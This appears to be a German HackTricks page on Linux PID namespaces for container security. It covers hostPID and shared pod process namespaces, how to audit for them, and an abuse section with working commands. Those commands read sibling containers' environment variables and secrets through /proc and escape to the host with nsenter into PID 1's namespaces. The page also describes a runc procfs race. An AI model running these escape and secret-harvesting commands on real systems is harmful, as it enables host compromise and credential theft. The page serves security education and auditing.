# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der PID-Namespace steuert, wie Prozesse nummeriert werden und welche Prozesse sichtbar sind. Deshalb kann ein Container seine eigene PID 1 haben, obwohl er keine echte Maschine ist. Innerhalb des Namespace sieht die Workload einen Prozessbaum, der wie ein lokaler Prozessbaum erscheint. Außerhalb des Namespace sieht der Host weiterhin die echten Host-PIDs und die vollständige Prozesslandschaft.<sup>[[3]](#references)</sup>

Aus Sicherheitssicht ist der PID-Namespace wichtig, weil die Sichtbarkeit von Prozessen wertvoll ist. Sobald eine Workload Host-Prozesse sehen kann, kann sie möglicherweise Servicenamen, Kommandozeilenargumente, in Prozessargumenten übergebene Secrets, aus der Umgebung abgeleitete Zustände über `/proc` und potenzielle Ziele für den Namespace-Einstieg beobachten. Wenn sie mehr tun kann, als diese Prozesse nur zu sehen, beispielsweise unter den richtigen Bedingungen Signale senden oder ptrace verwenden, wird das Problem deutlich ernster.

## Funktionsweise

Ein neuer PID-Namespace beginnt mit seiner eigenen internen Prozessnummerierung. Der erste darin erstellte Prozess wird aus Sicht des Namespace zu PID 1. Das bedeutet auch, dass er spezielle init-ähnliche Semantik für verwaiste Kindprozesse und das Signalverhalten erhält. Dies erklärt viele Besonderheiten von Containern im Zusammenhang mit init-Prozessen, dem Aufräumen von Zombie-Prozessen und der gelegentlichen Verwendung kleiner init-Wrapper in Containern.<sup>[[3]](#references)</sup>

PID-Namespaces bilden eine Hierarchie. Ein Prozess in einem übergeordneten Namespace kann Nachkommen über die in diesem übergeordneten Namespace zugewiesene PID adressieren, aber ein Nachkomme kann über gewöhnliche PID-basierte syscalls keine Tasks erreichen, die ausschließlich im übergeordneten Namespace existieren, oder sich mittels `setns()` nach oben in einen übergeordneten PID-Namespace einfügen. Ein dem Nachkommen absichtlich zugänglich gemachtes, dem übergeordneten Namespace zugehöriges procfs kann weiterhin die Prozessansicht des übergeordneten Namespace leaken. Außerdem ändert das Einfügen in einen PID-Namespace mit `setns()` den Namespace für **zukünftige Kindprozesse**, nicht für den Aufrufer selbst; Tools führen daher nach dem Einfügen einen fork aus. Ein procfs-Mount behält die PID-Ansicht des Prozesses bei, der ihn eingehängt hat. Deshalb ist das Erstellen eines neuen procfs nach `unshare(CLONE_NEWPID)` sicherheitsrelevant und nicht nur kosmetisch.<sup>[[3]](#references)</sup>

Die wichtige sicherheitsrelevante Erkenntnis ist, dass ein Prozess isoliert wirken kann, weil er nur seinen eigenen PID-Baum sieht, diese Isolation jedoch absichtlich entfernt werden kann. Docker stellt dies über `--pid=host` bereit, während Kubernetes dies über `hostPID: true` ermöglicht. Sobald der Container dem Host-PID-Namespace beitritt, sieht die Workload Host-Prozesse direkt, und viele nachfolgende Angriffspfade werden deutlich realistischer.

## Lab

Um manuell einen PID-Namespace zu erstellen:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die Shell sieht nun eine private Prozessansicht. Das Flag `--mount-proc` ist wichtig, da es eine procfs-Instanz einbindet, die dem neuen PID-Namespace entspricht, wodurch die Prozessliste innerhalb des Namespace konsistent ist.<sup>[[3]](#references)</sup>

Zum Vergleich des Containerverhaltens:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Der Unterschied ist unmittelbar und leicht verständlich, weshalb dies ein gutes erstes Lab für Leser ist.

## Verwendung der Runtime

Normale Container in Docker, Podman, containerd und CRI-O erhalten ihren eigenen PID-Namespace. Kubernetes-Container haben normalerweise separate PID-Ansichten; `shareProcessNamespace: true` erstellt absichtlich eine gemeinsame Ansicht für den gesamten Pod.<sup>[[4]](#references)</sup> Im Gegensatz dazu wählt `hostPID: true` den PID-Namespace des Nodes aus. LXC-/Incus-Umgebungen basieren auf demselben Kernel-Primitiv, auch wenn Anwendungsfälle mit System-Containern möglicherweise kompliziertere Prozessbäume aufweisen und zu mehr Debugging-Abkürzungen verleiten.

Dieselbe Regel gilt überall: Wenn die Runtime den PID-Namespace nicht isoliert hat, stellt dies eine beabsichtigte Verringerung der Container-Grenze dar.

## Fehlkonfigurationen

Die klassische Fehlkonfiguration ist die gemeinsame Nutzung des Host-PID-Namespace. Teams rechtfertigen dies häufig mit Debugging-, Monitoring- oder Service-Management-Komfort, es sollte jedoch immer als bedeutende Sicherheitsausnahme behandelt werden. Selbst wenn der Container keine unmittelbare Schreibmöglichkeit gegenüber Host-Prozessen besitzt, kann allein die Sichtbarkeit viel über das System offenlegen. Sobald Capabilities wie `CAP_SYS_PTRACE` oder nützlicher procfs-Zugriff hinzukommen, steigt das Risiko erheblich.

Ein weiterer Fehler besteht darin, anzunehmen, dass die gemeinsame Nutzung des Host-PID-Namespace harmlos sei, nur weil die Workload standardmäßig keine Host-Prozesse beenden oder per ptrace untersuchen kann. Diese Schlussfolgerung ignoriert den Wert der Enumeration, die Verfügbarkeit von Zielen für den Namespace-Eintritt und die Art und Weise, wie PID-Sichtbarkeit mit anderen abgeschwächten Kontrollen zusammenwirkt.

### Kubernetes-Pod-weite gemeinsame Prozessansicht

`shareProcessNamespace: true` unterscheidet sich von `hostPID`: Es legt die Prozesse der **anderen Container im selben Pod** offen, nicht die Prozesse des Nodes. Ein kompromittierter Sidecar- oder Debug-Container kann dann die Befehlszeilen und Umgebungsdaten von Geschwistern enumerieren, abhängig von den procfs-Zugriffsprüfungen Signale senden, wenn die Credentials dies erlauben, und über `/proc/<pid>/root` das Dateisystem eines Geschwisters durchlaufen. Kubernetes warnt ausdrücklich, dass Befehlszeilen-/Umgebungs-Secrets und Container-Dateisysteme dann nur durch die jeweils geltenden Unix-Berechtigungen geschützt sind.<sup>[[4]](#references)</sup>

Nützliche Überprüfung auf Cluster-Seite:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Aus einem kompromittierten Container in einem Pod-weiten PID-Namespace sollte zunächst der tatsächliche Zugriff getestet werden, anstatt anzunehmen, dass Sichtbarkeit gleichbedeutend mit Lesbarkeit ist:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Missbrauch

Wenn der Host-PID-Namespace gemeinsam genutzt wird, kann ein Angreifer Host-Prozesse untersuchen, Prozessargumente sammeln, interessante Dienste identifizieren, geeignete PIDs für `nsenter` finden oder die Prozesssichtbarkeit mit Berechtigungen im Zusammenhang mit `ptrace` kombinieren, um Host- oder benachbarte Workloads zu beeinträchtigen. In manchen Fällen reicht es bereits aus, den richtigen lang laufenden Prozess zu sehen, um den weiteren Angriffsplan anzupassen.

Der erste praktische Schritt besteht immer darin zu bestätigen, dass Host-Prozesse tatsächlich sichtbar sind:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sobald Host-PIDs sichtbar sind, werden Prozessargumente und Ziele für den Namespace-Eintritt oft zur nützlichsten Informationsquelle:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Wenn `nsenter` verfügbar ist und ausreichende Berechtigungen vorhanden sind, teste, ob ein sichtbarer Host-Prozess als Namespace-Brücke verwendet werden kann:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selbst wenn der Eintritt blockiert ist, ist das Teilen der Host-PIDs bereits wertvoll, da es das Service-Layout, Runtime-Komponenten und potenzielle privilegierte Prozesse offenlegt, die als nächste Ziele infrage kommen. Die alleinige Sichtbarkeit von PIDs gewährt **keine** Berechtigung, Signale zu senden, Tracing durchzuführen, sensible `/proc/<pid>`-Einträge zu lesen oder den anderen Namespaces des Ziels beizutreten; Credentials, Dumpability, Capabilities im User-Namespace, dem der Namespace des Ziels gehört, Yama/LSM-Richtlinien und seccomp sind weiterhin relevant.<sup>[[3]](#references)</sup> Siehe [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) für Beispiele zur Process Injection.

Die Sichtbarkeit von Host-PIDs macht auch den Missbrauch von File-Deskriptoren realistischer. Wenn ein privilegierter Host-Prozess oder eine benachbarte Workload eine sensible Datei oder einen Socket geöffnet hat, kann der Angreifer möglicherweise `/proc/<pid>/fd/` untersuchen und abhängig von ptrace-ähnlichen Prüfungen, Besitzverhältnissen, procfs-Mount-Optionen, dem Objekttyp und dem Servicemodell des Ziels auf das zugrunde liegende Objekt zugreifen. Das bloße Anzeigen eines FD-Symlinks bedeutet nicht, dass dieser geöffnet werden kann, und ein Socket kann nicht einfach durch das Öffnen seines `/proc/<pid>/fd/N`-Symlinks dupliziert werden. Informationen zur separaten `pidfd_getfd()`-Primitive und ihren Autorisierungsprüfungen finden Sie unter [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Diese Befehle sind nützlich, weil sie zeigen, ob `hidepid=1` oder `hidepid=2` die prozessübergreifende Sichtbarkeit reduziert und ob offensichtlich interessante Deskriptoren wie geöffnete secret files, Logs oder Unix-Sockets überhaupt sichtbar sind.

### Vollständiges Beispiel: Host-PID + `nsenter`

Das Teilen der Host-PID wird zu einem direkten host escape, wenn der Prozess außerdem über ausreichende Berechtigungen verfügt, um den Host-namespaces beizutreten:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Wenn der Befehl erfolgreich ist, wird der Containerprozess nun in den Mount-, UTS-, Netzwerk-, IPC- und PID-Namespaces des Hosts ausgeführt. Die Auswirkung ist eine sofortige Kompromittierung des Hosts.

Selbst wenn `nsenter` selbst fehlt, lässt sich dasselbe Ergebnis möglicherweise über die Host-Binärdatei erreichen, sofern das Host-Dateisystem eingehängt ist:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Aktuelle Runtime-Hinweise

Einige für PID-Namespaces relevante Angriffe sind keine herkömmlichen `hostPID: true`-Fehlkonfigurationen, sondern Implementierungsfehler der Runtime im Zusammenhang damit, wie procfs-Schutzmaßnahmen während der Container-Einrichtung angewendet werden.

#### `maskedPaths`-Race zu Host-procfs

In anfälligen `runc`-Versionen konnten Angreifer, die das Container-Image oder die `runc exec`-Workload kontrollieren konnten, die Maskierungsphase umgehen, indem sie das containerseitige `/dev/null` durch einen Symlink auf einen sensiblen procfs-Pfad wie `/proc/sys/kernel/core_pattern` ersetzten. Wenn die Race erfolgreich war, konnte der Bind-Mount des maskierten Pfads am falschen Ziel landen und Host-globale procfs-Schalter für den neuen Container offenlegen.<sup>[[1]](#references)</sup>

Nützlicher Befehl zur Überprüfung:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dies ist wichtig, weil die letztendlichen Auswirkungen denen einer direkten procfs-Exposition entsprechen können: beschreibbares `core_pattern` oder `sysrq-trigger`, gefolgt von Codeausführung auf dem Host oder einer Denial of Service. Die speziellen Seiten zu [maskierten Pfaden](../masked-paths.md) und [sensiblen Host-Mounts](../../sensitive-host-mounts.md) behandeln die allgemeine procfs-Angriffsfläche, ohne sie hier zu duplizieren.

#### Namespace-Injection mit `insject`

Tools zur Namespace-Injection wie `insject` zeigen, dass die Interaktion mit einem PID-Namespace nicht immer erfordert, vor der Prozesserstellung in den Ziel-Namespace einzutreten. Ein Helfer kann sich später anhängen, `setns()` verwenden und die Ausführung starten, während die Sichtbarkeit im Ziel-PID-Bereich erhalten bleibt:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Diese Art von Technik ist vor allem für fortgeschrittenes Debugging, offensive Tools und Post-Exploitation-Workflows relevant, bei denen der Namespace-Kontext verbunden werden muss, nachdem die Laufzeit die Workload bereits initialisiert hat.

### Verwandte FD-Abuse-Muster

Zwei Muster sollten ausdrücklich erwähnt werden, wenn Host-PIDs sichtbar sind. Erstens kann ein privilegierter Prozess einen sensiblen File Descriptor über `execve()` hinweg geöffnet halten, weil er nicht mit `O_CLOEXEC` markiert wurde. Zweitens können Services File Descriptors über Unix-Sockets mittels `SCM_RIGHTS` übergeben. In beiden Fällen ist das interessante Objekt nicht mehr der Pfadname, sondern der bereits geöffnete Handle, den ein Prozess mit geringeren Privilegien erben oder empfangen kann.

Dies ist bei der Arbeit mit Containern relevant, weil der Handle auf `docker.sock`, ein privilegiertes Log, eine geheime Host-Datei oder ein anderes hochwertiges Objekt zeigen kann, selbst wenn der Pfad selbst vom Container-Dateisystem aus nicht direkt erreichbar ist.

## Prüfungen

Der Zweck dieser Befehle besteht darin festzustellen, ob der Prozess eine private PID-Sicht hat oder ob er bereits eine deutlich umfassendere Prozesslandschaft aufzählen kann.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Was ist hier interessant:<sup>[[3]](#references)</sup>

- Wenn die Prozessliste offensichtliche Host-Dienste enthält, ist die gemeinsame Nutzung der Host-PIDs wahrscheinlich bereits aktiviert.
- Nur einen kleinen containerlokalen Prozessbaum zu sehen, ist der normale Ausgangszustand; `systemd`, `dockerd` oder unabhängige Daemons sind es nicht.
- `NSpid` kann das PID-Mapping über verschachtelte Namespaces hinweg offenlegen. Der Wert ganz links bezieht sich auf den PID-Namespace, der dem procfs-Mount zugeordnet ist, gefolgt von Werten für sukzessive verschachtelte Namespaces.
- `readlink /proc/self/ns/pid` allein kann `hostPID` nicht beweisen: Ein isolierter Container verfügt ebenfalls über eine gültige PID-Namespace-Inode. Stelle eine Korrelation mit der Prozessliste, dem procfs-Mount, der Runtime-Konfiguration und, sofern verfügbar, einer Namespace-Inode auf der Host-Seite her.
- Sobald Host-PIDs sichtbar sind, werden selbst schreibgeschützte Prozessinformationen zu nützlicher Reconnaissance.

Wenn du einen Container entdeckst, der mit gemeinsamer Nutzung der Host-PIDs läuft, solltest du dies nicht als kosmetischen Unterschied betrachten. Es handelt sich um eine wesentliche Änderung dessen, was die Workload beobachten und möglicherweise beeinflussen kann.



## References

- [1] [runc-Sicherheitswarnung: Container-Escape durch den Missbrauch von „masked path“ aufgrund von Mount-Race-Conditions (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool-Veröffentlichung – insject: Ein Linux-Namespace-Injektor](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux-man-pages-6.19-Buch](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Process-Namespace zwischen Containern in einem Pod gemeinsam nutzen](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
